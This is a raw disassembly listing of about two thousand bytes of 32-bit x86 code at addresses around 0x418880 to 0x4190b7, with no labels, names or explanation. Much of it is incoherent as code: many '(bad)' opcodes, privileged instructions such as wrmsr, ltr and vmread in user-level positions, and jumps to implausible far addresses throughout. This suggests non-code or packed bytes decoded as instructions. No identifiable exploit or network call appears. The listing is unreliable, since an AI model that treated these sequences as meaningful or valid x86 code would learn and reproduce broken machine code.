  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
